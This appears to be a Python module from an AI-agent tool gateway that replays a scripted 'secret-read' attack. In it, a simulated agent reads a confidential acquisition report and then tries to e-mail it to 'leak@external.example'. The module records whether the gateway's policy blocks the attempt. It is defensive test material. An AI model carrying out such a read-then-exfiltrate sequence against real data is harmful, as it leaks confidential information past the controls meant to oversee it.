"""Deterministic attack simulations executed through the real gateway.

Nothing here is scripted to "look blocked": each step builds an ordinary
tool-call request and hands it to :meth:`Gateway.submit`, exactly like any
other agent. The returned record contains the gateway's own response, the
audit events it produced, and observed side-effect counts from the mock
stores, so a UI can render the outcome without inventing it.

Current scenarios
-----------------
``secret-read``
    Read a confidential internal document, then attempt to e-mail it to an
    unapproved external address carrying the minted provenance. The second
    step is the classic exfiltration move the data-flow rules exist for.
"""

from __future__ import annotations

import json
import time
import uuid
from typing import Any

from .db import Database
from .gateway import Gateway
from .models import POLICY_VERSION

SCENARIOS = {
    "secret-read": {
        "label": "Secret-read exfiltration",
        "description": (
            "The agent reads a confidential acquisition report, then tries to "
            "e-mail it to an external address with the provenance attached."
        ),
        "source_path": "/internal/acquisition_report.pdf",
        "destination": "leak@external.example",
    }
}


def _audit_since(gateway: Gateway, after_seq: int) -> list[dict[str, Any]]:
    return [
        event
        for event in gateway.audit.events()
        if int(event["seq"]) > after_seq
    ]


def _last_seq(gateway: Gateway) -> int:
    events = gateway.audit.events(limit=1)
    return int(events[-1]["seq"]) if events else 0


def _strip_bodies(events: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Keep audit events, but never echo read content back to a UI."""
    cleaned: list[dict[str, Any]] = []
    for event in events:
        payload = dict(event.get("payload") or {})
        payload.pop("content", None)
        cleaned.append({**event, "payload": payload})
    return cleaned


def _strip_result_content(response: dict[str, Any]) -> dict[str, Any]:
    if not isinstance(response.get("result"), dict):
        return response
    result = dict(response["result"])
    output = dict(result.get("output") or {})
    if "content" in output:
        output["content"] = "[mock document content omitted from simulation output]"
    result["output"] = output
    return {**response, "result": result}


def _persist(db: Database, run_id: str, scenario: str, record: dict[str, Any]) -> None:
    db.execute(
        "INSERT OR REPLACE INTO simulation_runs "
        "(run_id, scenario, created_at, outcome, reason_code, results_json) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        (
            run_id,
            scenario,
            float(record["created_at"]),
            str(record["result"]["decision"] or "NONE"),
            record["result"].get("reason_code"),
            json.dumps(record, sort_keys=True, separators=(",", ":")),
        ),
    )


def run_secret_read(gateway: Gateway) -> dict[str, Any]:
    """Run the secret-read attack end to end; return observed evidence."""
    scenario = SCENARIOS["secret-read"]
    run_id = "sim_" + uuid.uuid4().hex
    session_id = f"sess-{run_id[-12:]}"
    actor_id = "agent-sim-1"
    created_at = time.time()

    outbox_before = gateway.db.count("mock_outbox")
    steps: list[dict[str, Any]] = []

    read_request = {
        "request_id": f"{run_id}-read",
        "actor_id": actor_id,
        "session_id": session_id,
        "tool_name": "file_tool",
        "operation": "read",
        "arguments": {"path": scenario["source_path"]},
        "data_classification": "confidential",
        "policy_version": POLICY_VERSION,
    }
    before = _last_seq(gateway)
    read_response = gateway.submit(read_request)
    read_events = _strip_bodies(_audit_since(gateway, before))
    provenance: list[str] = []
    raw_provenance = ((read_response.get("result") or {}).get("output") or {}).get(
        "provenance"
    )
    if isinstance(raw_provenance, list):
        provenance = [str(item) for item in raw_provenance]
    output = (read_response.get("result") or {}).get("output") or {}
    steps.append(
        {
            "step": 1,
            "name": "read_confidential_source",
            "request": read_request,
            "response": _strip_result_content(read_response),
            "audit_events": read_events,
            "observed": {
                "classification": output.get("classification"),
                "provenance": provenance,
                "executed": read_response.get("status") == "EXECUTED",
            },
        }
    )

    send_request = {
        "request_id": f"{run_id}-exfil",
        "actor_id": actor_id,
        "session_id": session_id,
        "tool_name": "email_tool",
        "operation": "send",
        "arguments": {
            "recipient": scenario["destination"],
            "subject": "Acquisition report",
            "body": "Indicative offer 4.2M USD.",
        },
        "destination": scenario["destination"],
        "data_classification": "confidential",
        "provenance": provenance,
        "policy_version": POLICY_VERSION,
    }
    before = _last_seq(gateway)
    send_response = gateway.submit(send_request)
    send_events = _strip_bodies(_audit_since(gateway, before))
    outbox_after = gateway.db.count("mock_outbox")
    ledger_rows = gateway.db.count(
        "execution_ledger", "request_id = ?", (send_request["request_id"],)
    )
    steps.append(
        {
            "step": 2,
            "name": "exfiltrate_to_external_destination",
            "request": send_request,
            "response": _strip_result_content(send_response),
            "audit_events": send_events,
            "observed": {
                "executed": send_response.get("status") == "EXECUTED",
                "side_effect": outbox_after > outbox_before,
                "execution_rows": ledger_rows,
            },
        }
    )

    decision = send_response.get("decision")
    blocked_at = "policy_engine" if decision == "DENY" else (
        "approval_service" if decision == "APPROVAL" else "executor"
    )
    record: dict[str, Any] = {
        "run_id": run_id,
        "scenario": "secret-read",
        "scenario_label": scenario["label"],
        "scenario_description": scenario["description"],
        "created_at": created_at,
        "policy_version": POLICY_VERSION,
        "actor_id": actor_id,
        "session_id": session_id,
        "steps": steps,
        "result": {
            "request_id": send_request["request_id"],
            "decision": decision,
            "reason_code": send_response.get("reason_code"),
            "status": send_response.get("status"),
            "explanation": send_response.get("explanation"),
            "executed": send_response.get("status") == "EXECUTED",
            "side_effect": outbox_after > outbox_before,
            "blocked_at": blocked_at if not send_response.get("status") == "EXECUTED" else None,
            "approval_id": (send_response.get("approval") or {}).get("approval_id"),
            "outbox_before": outbox_before,
            "outbox_after": outbox_after,
            "execution_rows": ledger_rows,
        },
        "audit": {
            "event_count": gateway.audit.count(),
            "head": gateway.audit.head(),
        },
        "notes": [
            "Every step was submitted through Gateway.submit; no tool was called directly.",
            "Side-effect claims come from mock-store row counts before and after the run.",
            "The UI must display the observed decision, including unexpected outcomes.",
        ],
    }
    _persist(gateway.db, run_id, "secret-read", record)
    return record


def list_simulations(db: Database, limit: int = 20) -> list[dict[str, Any]]:
    rows = db.query(
        "SELECT run_id, scenario, created_at, outcome, reason_code "
        "FROM simulation_runs ORDER BY created_at DESC LIMIT ?",
        (limit,),
    )
    return [
        {
            "run_id": str(row["run_id"]),
            "scenario": str(row["scenario"]),
            "created_at": float(row["created_at"]),
            "outcome": str(row["outcome"]),
            "reason_code": row["reason_code"],
        }
        for row in rows
    ]


def latest_simulation(db: Database) -> dict[str, Any] | None:
    row = db.query_one(
        "SELECT results_json FROM simulation_runs ORDER BY created_at DESC LIMIT 1"
    )
    return None if row is None else json.loads(str(row["results_json"]))


def get_simulation(db: Database, run_id: str) -> dict[str, Any] | None:
    row = db.query_one(
        "SELECT results_json FROM simulation_runs WHERE run_id = ?", (run_id,)
    )
    return None if row is None else json.loads(str(row["results_json"]))
